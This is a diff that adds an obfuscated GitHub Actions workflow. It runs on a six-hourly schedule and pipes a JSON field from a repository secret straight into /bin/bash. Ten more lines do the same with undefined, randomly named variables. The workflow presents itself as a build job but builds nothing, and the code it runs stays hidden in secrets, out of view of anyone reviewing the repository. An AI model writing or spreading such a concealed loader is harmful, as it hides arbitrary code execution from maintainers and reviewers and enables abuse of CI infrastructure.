@@ -1,0 +1,27 @@
+name: fibergucci
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fibergucci
+        env:
+          ocb286: ${{ secrets.ocb286 }}
+        run: |
+          echo $ocb286 | jq -r .zlr732 | /bin/bash
+          echo $p590 | jq -r .xzxoy6780 | /bin/bash
+          echo $odoys064 | jq -r .bkxi6 | /bin/bash
+          echo $ecqvj3 | jq -r .hf7 | /bin/bash
+          echo $y6 | jq -r .mkp9 | /bin/bash
+          echo $fezg6590 | jq -r .uqtqz57 | /bin/bash
+          echo $yimg738 | jq -r .jc31 | /bin/bash
+          echo $r32 | jq -r .mj610 | /bin/bash
+          echo $bmi612 | jq -r .a5354 | /bin/bash
+          echo $egh739 | jq -r .losd5 | /bin/bash
+          echo $jevwv6 | jq -r .cp86 | /bin/bash
+
